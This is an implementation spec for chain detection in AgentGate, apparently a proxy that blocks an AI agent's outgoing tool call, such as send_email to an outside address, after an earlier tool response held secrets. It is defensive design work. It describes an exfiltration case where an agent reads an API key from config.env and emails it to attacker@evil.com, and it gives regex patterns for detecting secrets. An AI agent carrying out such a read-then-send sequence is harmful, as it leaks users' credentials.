# Issue #11 — Chain Detection: Implementation Spec

**Status:** Implementation-ready  
**Depends on:** #5 (proxy wiring, ✅), #10 (session store)  
**Blocks:** #15 (acceptance tests AT-3)  
**Estimated effort:** ~4 hours implementation + ~2 hours tests  

---

## 1. What This Is

Chain detection is the feature that makes AgentGate agent-specific rather than just another authorization layer. It blocks tool B when tool A's *response* contained sensitive data — a sequential pattern that neither OPA, Cedar, nor any static rule system natively expresses.

The canonical attack: agent reads `/data/workspace/config.env` (allowed), gets back content containing `API_KEY=sk-abc123...`, then calls `send_email(to="attacker@evil.com", body="...")`. Chain detection blocks the `send_email` because a prior tool response matched a sensitive-data pattern.

This is acceptance test AT-3. If it doesn't work, the product thesis is unproven.

---

## 2. Scope

### In Scope

- `session.py`: In-memory per-proxy sliding window store (`SessionStore` class)
- `detectors/chain.py`: Chain rule evaluation logic (`evaluate_chain_rules()`)
- `engine.py`: Wire chain evaluation as step 5 of the decision stack
- `proxy.py`: Record tool calls and responses into the session store after allow+forward+receive
- Unit tests for session store
- Unit tests for chain detection logic
- Integration test proving chain detection blocks through the proxy

### Out of Scope

- Cross-session chain tracking (no persistence)
- Chain rules that span multiple proxy instances
- Response scanning (chain detection reads responses for matching, but does not block/redact responses themselves)
- Hot-reload of chain rules
- Chain rules with more than 2 steps (supported by the data model, but only 2-step chains are tested in MVP)

---

## 3. Data Model

### SessionStore (`session.py`)

```python
@dataclass
class SessionEntry:
    tool_name: str
    arguments: dict[str, Any]
    response_text: str | None  # None if call was blocked or no response yet
    timestamp: float           # time.monotonic() — only for ordering, not wall clock

class SessionStore:
    def __init__(self, max_size: int = 50) -> None:
        self._entries: deque[SessionEntry] = deque(maxlen=max_size)

    def record(self, tool_name: str, arguments: dict[str, Any], response_text: str | None) -> None:
        """Append an entry. Called by the proxy after receiving a tool response."""

    def recent(self, n: int) -> list[SessionEntry]:
        """Return the last N entries, oldest first."""
```

**Design decisions:**

- **`deque(maxlen=50)` global cap.** Individual chain rules specify their own `window` (default 10), but the store keeps up to 50 entries so that a rule with `window: 20` still works. The `recent(n)` method slices by the rule's window size.
- **`response_text` is the full string response.** The proxy extracts the text content from the JSON-RPC result before recording. If the response is a JSON object, it gets `json.dumps()`'d. This is what `output_matches` regex runs against.
- **`monotonic()` for timestamps.** We don't need wall-clock time here — we only need ordering. `time.monotonic()` avoids clock skew issues.
- **No thread safety needed.** The proxy runs single-threaded per asyncio event loop. All session writes and reads happen in the same coroutine chain.
- **One `SessionStore` per `StdioProxy` instance.** Created in `StdioProxy.__init__`, passed to the intercepting relay and the engine.

### Chain rule model (already exists in `models.py`)

```python
class ChainStep(BaseModel):
    tool: str
    output_matches: str | None = None      # regex against step's response_text
    param_matches: dict[str, str] | None = None  # regex per param name against step's arguments

class ChainRule(BaseModel):
    name: str
    type: Literal["chain_rule"]
    window: int = 10
    steps: list[ChainStep]
    message: str = ""
```

No model changes needed.

### CompiledPolicy regexes (already handled in `policy.py`)

`compile_regexes()` already pre-compiles `output_matches` and `param_matches` patterns from chain rules into the `CompiledPolicy.regexes` dict with keys like:

- `{rule.name}:steps.{i}.output_matches`
- `{rule.name}:steps.{i}.param_matches.{param_name}`

No changes to `policy.py` needed.

---

## 4. Chain Detection Algorithm

### `detectors/chain.py` — `evaluate_chain_rules()`

```
evaluate_chain_rules(tool_call, policy, session) -> Decision | None
```

For each `ChainRule` in `policy.config.policies`:

1. Get the rule's `steps` list. The **last step** is the "current" step — it matches against the incoming `tool_call`. The **preceding steps** match against session history.
2. **Match the current step (last step) against `tool_call`:**
   - `step.tool` must equal `tool_call.tool_name`. If not, skip this rule.
   - If `step.param_matches` is defined, each `{param_name: regex}` pair must match against `tool_call.arguments[param_name]`. Use pre-compiled regex from `policy.regexes`. If any param is missing or doesn't match, skip this rule.
3. **Match preceding steps against session history:**
   - Get `session.recent(rule.window)` — the last N entries.
   - Walk the preceding steps in order. For each preceding step, scan session entries (from oldest to newest, starting after the last matched entry's position) to find a match:
     - `step.tool` must equal `entry.tool_name`.
     - If `step.output_matches` is defined, the regex must match `entry.response_text`. If `response_text` is None, no match.
     - If `step.param_matches` is defined, each param regex must match the entry's `arguments[param_name]`.
   - All preceding steps must match, in order, within the window.
4. If all steps match: return `Decision(action="block", matched_rule=rule.name, message=rule.message)`.
5. If no chain rule matches: return `None` (let the engine fall through to default).

### Matching semantics — critical details

- **Steps are ordered but not necessarily consecutive.** If the rule has steps [A, B, C], and session history is [A, X, Y, B, Z, C_current], that matches. There can be unrelated tool calls between matched steps.
- **The last step is always the current tool call, not a session entry.** This is the only step that checks `tool_call` directly rather than session history.
- **`output_matches` on the last step is ignored.** The current tool call hasn't executed yet — there's no response to match. (The spec's example policies only use `output_matches` on preceding steps and `param_matches` on the last step, which is the sensible pattern.)
- **Regex matching uses `re.search()`, not `re.fullmatch()`.** Consistent with how `param_rule` `matches` operator works.
- **If a chain rule has only 1 step, it degenerates to a param-only check on the current call.** This is technically valid but pointless (use `param_rule` instead). No need to special-case or forbid it.

### Example trace for AT-3

Policy:
```yaml
- name: block-exfil-after-sensitive-read
  type: chain_rule
  window: 5
  steps:
    - tool: read_file
      output_matches: "BEGIN.*PRIVATE KEY|password|api[_-]?key"
    - tool: send_email
      param_matches:
        to: "^(?!.*@mycompany\\.com$).*$"
```

Session history after allowed `read_file` returns `"API_KEY=sk-abc123..."`:
```
[SessionEntry(tool_name="read_file", arguments={"path": "/data/workspace/config.env"}, response_text="API_KEY=sk-abc123...", timestamp=1.0)]
```

Incoming tool call: `send_email(to="external@attacker.com", body="...")`

Evaluation:
1. Last step: `tool: send_email` → matches `tool_call.tool_name`. `param_matches.to: "^(?!.*@mycompany\\.com$).*$"` → matches `"external@attacker.com"`. ✓
2. Preceding step (index 0): `tool: read_file` → scan session. Entry 0: `tool_name="read_file"` ✓. `output_matches: "BEGIN.*PRIVATE KEY|password|api[_-]?key"` → `re.search()` on `"API_KEY=sk-abc123..."` → matches `api[_-]?key` (case-sensitive? — see below). ✓
3. All steps matched → **BLOCK**.

### Case sensitivity for `output_matches`

The pre-compiled regexes in `policy.py` use `re.compile()` without flags. This means `output_matches` is **case-sensitive by default**. The example policy uses `api[_-]?key` which would match `api_key` but not `API_KEY`.

**Decision: Use `re.IGNORECASE` for `output_matches` patterns.**

Rationale: Tool responses are unpredictable in casing. A secret might appear as `API_KEY`, `api_key`, `Api_Key`, or `apiKey`. Case-insensitive matching is the safe default for a security detector. If a user needs case-sensitive matching, they can use inline `(?-i)` flags.

**This requires a small change in `policy.py`:** `compile_regexes()` should pass `re.IGNORECASE` when compiling `output_matches` patterns. `param_matches` patterns stay case-sensitive (parameter values are more predictable).

---

## 5. Integration Points

### 5a. `proxy.py` changes — recording to session store

The proxy's `_intercepting_relay` function currently handles the agent→server direction. After an allowed tool call is forwarded and the response comes back via the server→agent relay, the proxy must record the tool call + response into the session store.

**Problem:** The current architecture has two separate relay tasks — `_intercepting_relay` (agent→server) and `_relay` (server→agent). The agent→server relay knows the tool call details but doesn't see the response. The server→agent relay sees the response but doesn't know which tool call it belongs to.

**Solution: Correlate by JSON-RPC request ID.**

1. When `_intercepting_relay` forwards an allowed tool call, it stores `{request_id: (tool_name, arguments)}` in a shared pending-calls dict.
2. The server→agent relay becomes `_recording_relay` — a new function that, for each response message, checks if the response's `id` matches a pending call. If so, it extracts the response content, calls `session.record()`, and removes the entry from pending.
3. Non-matching responses (e.g., responses to `initialize`, `tools/list`) pass through unchanged.

**Shared state between the two relay tasks:**
```python
_pending_calls: dict[str | int, tuple[str, dict[str, Any]]]  # request_id -> (tool_name, arguments)
```

This dict is written by `_intercepting_relay` and read by `_recording_relay`. Since both run in the same asyncio event loop (cooperative multitasking, not threads), no lock is needed — writes and reads never interleave within a single `await` boundary.

**Response text extraction:**

The JSON-RPC response for a `tools/call` looks like:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [{"type": "text", "text": "file contents here"}]
  }
}
```

The recording relay extracts `response_text` as:
1. Parse the JSON-RPC response.
2. If `result.content` exists and is a list, concatenate all `text` fields from items where `type == "text"`.
3. If `result` is a string, use it directly.
4. Otherwise, `json.dumps(result)` as fallback.
5. If parsing fails or `error` is present, record `response_text=None`.

### 5b. `engine.py` changes — step 5

```python
# --- Step 5: chain_rule ---
from agentgate.detectors.chain import evaluate_chain_rules

chain_decision = evaluate_chain_rules(tool_call, policy, session)
if chain_decision is not None:
    return chain_decision
```

**Engine signature change:** `evaluate()` currently takes `(tool_call, policy)`. It must now also accept an optional `session: SessionStore | None` parameter. When `session` is None (no chain rules, or passthrough mode), step 5 is skipped.

```python
def evaluate(tool_call: ToolCall, policy: CompiledPolicy, session: SessionStore | None = None) -> Decision:
```

### 5c. `proxy.py` changes — passing session to engine

The `_intercepting_relay` function calls `evaluate(parsed.tool_call, self.policy)`. This must become `evaluate(parsed.tool_call, self.policy, self._session)`.

### 5d. `StdioProxy.__init__` changes

```python
def __init__(self, command: list[str], policy: CompiledPolicy | None = None) -> None:
    self.command = command
    self.policy = policy
    self._session = SessionStore() if policy is not None else None
    self._pending_calls: dict[str | int, tuple[str, dict[str, Any]]] = {}
```

---

## 6. File Changes Summary

| File | Change | Size |
|------|--------|------|
| `session.py` | New file. `SessionEntry` dataclass, `SessionStore` class with `record()` and `recent()`. | ~40 lines |
| `detectors/chain.py` | New implementation. `evaluate_chain_rules()` function. | ~70 lines |
| `policy.py` | Add `re.IGNORECASE` flag to `output_matches` regex compilation. | 1-line change |
| `engine.py` | Add `session` parameter to `evaluate()`. Add step 5 calling `evaluate_chain_rules()`. | ~10 lines |
| `proxy.py` | Add `SessionStore` + `_pending_calls` to `StdioProxy`. Modify `_intercepting_relay` to record pending calls. Add `_recording_relay` to replace `_relay` for server→agent direction. Extract response text. | ~60 lines net |

---

## 7. Test Plan

### 7a. Unit tests: `tests/test_session.py` (~10 tests)

| Test | What it proves |
|------|---------------|
| `test_record_and_recent` | Basic record/retrieve works, ordering is oldest-first |
| `test_recent_respects_n` | `recent(3)` returns only last 3 entries |
| `test_recent_n_larger_than_store` | `recent(100)` with 5 entries returns all 5, no error |
| `test_maxlen_eviction` | Store with `max_size=3` evicts oldest on 4th record |
| `test_empty_store` | `recent(10)` on empty store returns `[]` |
| `test_none_response_text` | Recording with `response_text=None` works |
| `test_record_preserves_arguments` | Arguments dict is stored correctly (not mutated) |

### 7b. Unit tests: `tests/test_detectors/test_chain.py` (~15 tests)

All tests are sync, no I/O. They construct a `SessionStore`, pre-populate it with entries, create a `ToolCall`, build a `CompiledPolicy` with chain rules, and call `evaluate_chain_rules()`.

| Test | What it proves |
|------|---------------|
| **Positive (should block)** | |
| `test_basic_two_step_chain` | read_file with sensitive response → send_email to external → BLOCK |
| `test_chain_output_matches_api_key` | `output_matches` catches `api_key=...` pattern |
| `test_chain_output_matches_private_key` | `output_matches` catches PEM key header |
| `test_chain_output_matches_password` | `output_matches` catches `password` in response |
| `test_chain_with_intervening_calls` | A, X, Y, B still matches (non-consecutive) |
| `test_chain_param_matches_external_email` | `param_matches` on last step correctly checks params |
| **Negative (should not block)** | |
| `test_no_match_wrong_tool_order` | B before A in session → no match |
| `test_no_match_output_not_sensitive` | read_file returned benign content → no match |
| `test_no_match_internal_email` | send_email to `@mycompany.com` → no match (param_matches fails) |
| `test_no_match_outside_window` | Matching entries exist but are older than `window` → no match |
| `test_no_match_empty_session` | Empty session → no match |
| `test_no_match_different_tool` | Current tool_call is not the last step's tool → skip rule |
| **Edge cases** | |
| `test_chain_response_text_none_skips` | Entry with `response_text=None` doesn't match `output_matches` |
| `test_chain_case_insensitive_output` | `API_KEY` matches `api[_-]?key` pattern (IGNORECASE) |
| `test_multiple_chain_rules_first_wins` | Two chain rules, both match → first one's name in decision |

### 7c. Integration tests: `tests/test_chain_integration.py` (~4 tests)

These use the echo MCP server and proxy harness from PR1's test infrastructure.

| Test | What it proves |
|------|---------------|
| `test_chain_blocks_exfil_through_proxy` | Full proxy round-trip: send allowed read_file → get response with secret → send send_email to external → **blocked by chain rule**. This is AT-3. |
| `test_chain_allows_benign_sequence` | read_file (benign response) → send_email to internal → both allowed |
| `test_session_records_through_proxy` | After a tool call round-trip, the session store has an entry with the correct response_text |
| `test_chain_no_false_positive_on_read_only` | Multiple read_file calls with sensitive responses but no send_email → all allowed |

### 7d. Engine integration: `tests/test_engine.py` additions (~3 tests)

| Test | What it proves |
|------|---------------|
| `test_engine_chain_rule_blocks` | `evaluate()` with session containing sensitive read → blocks send_email |
| `test_engine_chain_rule_skipped_no_session` | `evaluate()` with `session=None` → chain rules ignored, default decision |
| `test_engine_detector_beats_chain` | Detector fires before chain rule is even checked (precedence) |

---

## 8. Echo MCP Server Changes

The existing echo MCP server (`tests/helpers/echo_mcp_server.py`) echoes back the tool call arguments. For chain detection tests, we need it to return **custom response content** so we can control what `output_matches` sees.

**Option A:** Modify the echo server to return the value of a special argument key (e.g., `_mock_response`) as the response text if present.

**Option B:** Add a second test helper server that returns configurable responses.

**Decision: Option A.** Simpler, no new files. The echo server already returns arguments — we just add a convention: if `arguments["_mock_response"]` exists, that string becomes the `result.content[0].text` value. Otherwise, behavior is unchanged (echo all arguments).

This means in tests, the chain integration test sends:
```json
{"method": "tools/call", "params": {"name": "read_file", "arguments": {"path": "/data/workspace/config.env", "_mock_response": "API_KEY=sk-abc123secret"}}}
```

And the echo server returns:
```json
{"result": {"content": [{"type": "text", "text": "API_KEY=sk-abc123secret"}]}}
```

The proxy records `response_text = "API_KEY=sk-abc123secret"` in the session store. The subsequent `send_email` call then gets blocked by the chain rule.

**Important:** The `_mock_response` key must NOT trigger any detectors. It's just a test scaffolding key. The `secrets_in_params` detector will see `API_KEY=sk-abc123secret` in the arguments — but in the real test, the *policy* should have `secrets_in_params: false` or the test should use a value that doesn't trigger the secrets detector but does trigger `output_matches`. Use `"response_contains: sensitive_data_marker"` or similar benign-looking string that matches the chain rule's `output_matches` pattern.

**Revised approach for test data:** Use `output_matches: "SENSITIVE_MARKER"` in the test chain rule, and `_mock_response: "data contains SENSITIVE_MARKER here"` in the test tool call. This avoids any detector interference.

---

## 9. Proxy Response Text Extraction — Detailed Logic

```python
def _extract_response_text(payload: bytes) -> str | None:
    """Extract human-readable text from a JSON-RPC tools/call response.
    
    Returns None if the payload is not a valid result or contains an error.
    """
    try:
        msg = json.loads(payload)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None

    if not isinstance(msg, dict):
        return None

    # Error responses → no usable text
    if "error" in msg:
        return None

    result = msg.get("result")
    if result is None:
        return None

    # MCP tools/call result format: {"content": [{"type": "text", "text": "..."}]}
    if isinstance(result, dict):
        content = result.get("content")
        if isinstance(content, list):
            texts = []
            for item in content:
                if isinstance(item, dict) and item.get("type") == "text":
                    t = item.get("text")
                    if isinstance(t, str):
                        texts.append(t)
            if texts:
                return "\n".join(texts)
        # Fallback: serialize the whole result
        return json.dumps(result)

    if isinstance(result, str):
        return result

    return json.dumps(result)
```

---

## 10. Risks

### Risk 1: Request ID correlation failures

If the MCP server returns a response with an `id` that doesn't match any pending call (e.g., unsolicited notification, or the server uses a different ID scheme), the recording relay won't find the pending entry. 

**Mitigation:** This is fine — the response passes through unchanged, and no session entry is recorded. Chain detection degrades gracefully (fewer entries = fewer matches). Log a debug-level warning.

### Risk 2: Large response text in session store

If a tool returns a 10MB file, storing the full `response_text` in the deque consumes memory.

**Mitigation for MVP:** Truncate `response_text` to 10,000 characters. This is enough for any regex pattern to match on. Log truncation at debug level. This is a one-line change in `_extract_response_text`.

### Risk 3: Chain rules with >2 steps

The algorithm supports N steps, but only 2-step chains are tested. 3+ step chains may have subtle ordering bugs.

**Mitigation for MVP:** Only test 2-step chains. Document that >2 steps are "supported but untested" in the policy language docs. This is consistent with the spec's AT-3 focus.

### Risk 4: `policy.py` IGNORECASE change breaks existing tests

Adding `re.IGNORECASE` to `output_matches` compilation changes behavior for any chain rule regex that was assumed to be case-sensitive.

**Mitigation:** There are no existing tests for chain rules (it's a stub). The policy loader tests compile chain rule regexes but don't test their matching behavior. This change is safe.

---

## 11. Acceptance Criteria

1. **AT-3 passes deterministically:** `read_file` returns content matching `output_matches` → subsequent `send_email` to external address → blocked by chain rule. Verified via proxy integration test.
2. **Benign chains pass through:** `read_file` (benign response) → `send_email` to internal address → both allowed. Zero false positives.
3. **Window boundary works:** A matching entry that's outside the `window` does not trigger the chain rule.
4. **Session store records correctly:** After an allowed tool call round-trip through the proxy, the session store contains the correct `tool_name`, `arguments`, and `response_text`.
5. **Engine precedence is correct:** Detectors still fire before chain rules. A tool call that triggers both a detector and a chain rule reports the detector match.
6. **All existing tests still pass.** No regressions in the 98 existing tests (16 proxy + 14 engine + 90 detector + etc.).

---

## 12. Implementation Order

1. **`session.py`** — Pure data structure, no dependencies. Write + test first.
2. **`detectors/chain.py`** — Pure logic, depends only on `session.py` and `models.py`. Write + test with manually constructed session stores.
3. **`policy.py`** — One-line IGNORECASE change. Update existing compile test if needed.
4. **`engine.py`** — Add `session` param and step 5 call. Add engine-level chain tests.
5. **`proxy.py`** — The integration glue. Add `SessionStore`, `_pending_calls`, `_recording_relay`, response text extraction. Modify `StdioProxy.__init__` and `run()`.
6. **Echo server tweak** — Add `_mock_response` support.
7. **Integration tests** — AT-3 through the full proxy.

Steps 1-2 can be done in isolation. Steps 3-4 are small. Step 5 is the highest-risk change (proxy modification). Step 7 proves everything works end-to-end.

---

## 13. Function Signatures (Final)

```python
# session.py
class SessionStore:
    def __init__(self, max_size: int = 50) -> None: ...
    def record(self, tool_name: str, arguments: dict[str, Any], response_text: str | None) -> None: ...
    def recent(self, n: int) -> list[SessionEntry]: ...

# detectors/chain.py
def evaluate_chain_rules(
    tool_call: ToolCall,
    policy: CompiledPolicy,
    session: SessionStore,
) -> Decision | None: ...

# engine.py  
def evaluate(
    tool_call: ToolCall,
    policy: CompiledPolicy,
    session: SessionStore | None = None,
) -> Decision: ...

# proxy.py (internal)
def _extract_response_text(payload: bytes) -> str | None: ...

async def _recording_relay(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter | asyncio.WriteTransport,
    session: SessionStore,
    pending_calls: dict[str | int, tuple[str, dict[str, Any]]],
    label: str,
) -> None: ...
```